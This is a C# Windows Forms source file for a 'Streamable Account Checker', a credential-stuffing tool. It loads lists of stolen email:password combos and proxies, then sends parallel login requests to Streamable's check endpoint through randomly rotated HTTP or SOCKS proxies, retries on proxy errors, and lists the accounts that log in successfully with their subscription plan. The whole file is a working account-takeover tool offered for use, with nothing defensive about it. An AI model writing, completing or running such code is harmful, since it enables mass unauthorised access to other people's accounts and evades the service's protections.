using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using Newtonsoft.Json.Linq;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Windows.Forms;
using Leaf.xNet;
using System.Threading;

namespace Streamable_Account_Checker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        public string[] proxies;
        public string[] combos;

        public class LoginDetails
        {
            public string username { get; set; }
            public string password { get; set; }
        }

        private void loadProxies()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Load Proxy";
            openFileDialog.Filter = "Proxies|*.txt";
            if(openFileDialog.ShowDialog() == DialogResult.OK)
            {
                proxies = File.ReadAllLines(openFileDialog.FileName.ToString());
                label_TotalProxy.Text = proxies.Length.ToString();
            }
            
        }

        private void loadCombos()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Load Combos";
            openFileDialog.Filter = "Combos|*.txt";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                combos = File.ReadAllLines(openFileDialog.FileName.ToString());
                label_TotalCombo.Text = combos.Length.ToString();
            }

        }

        public string randomProxy()
        {
            Random random = new Random();
            int index = random.Next(proxies.Length);
            return proxies[index];
        }

        public void checker(string email, string password)
        {
            HttpRequest request = new HttpRequest();
            request.UserAgent = Http.ChromeUserAgent();

            while (true)
            {
                LoginDetails loginDetails = new LoginDetails
                {
                    username = email,
                    password = password
                };

                string postData = JsonConvert.SerializeObject(loginDetails);
                try
                {


                    if (radioButton_HTTP.Checked)
                        request.Proxy = HttpProxyClient.Parse(randomProxy());

                    if (radioButton_Socks4.Checked)
                        request.Proxy = Socks4ProxyClient.Parse(randomProxy());

                    if (radioButton_Socks5.Checked)
                        request.Proxy = Socks5ProxyClient.Parse(randomProxy());

                    string response = request.Post("https://ajax.streamable.com/check", postData, "application/json").ToString();

                    if (response.Contains("ad_tags"))
                    {
                        JObject planName = JObject.Parse(response);
                        
                        textBox_Results.Text += "[GOOD] " + email + ":" + password + " Plan= "+planName.SelectToken("plan_name") + Environment.NewLine;
                        label_Success.Text = (int.Parse(label_Success.Text) + 1).ToString();
                        break;
                    }
                    else
                    {
                        label_Fail.Text = (int.Parse(label_Fail.Text) + 1).ToString();
                        break;
                    }
                }
                catch (HttpException)
                {
                    label_ProxyError.Text = (int.Parse(label_ProxyError.Text) + 1).ToString();
                }
            }
                       
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button_LoadProxy_Click(object sender, EventArgs e)
        {
            loadProxies();
        }

        private void button_LoadCombo_Click(object sender, EventArgs e)
        {
            loadCombos();
        }

        private void seperateThread()
        {
            var tasks =
                from combo in combos
                let account = combo.Split(new char[] { ':' })
                let email = account[0]
                let password = account[1]
                select Task.Factory.StartNew(() => checker(email, password));
            Task.WaitAll(tasks.ToArray());
        }

        private void button_Start_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(seperateThread);
            thread.Start();
            thread.IsBackground = true;


        }
    }
}
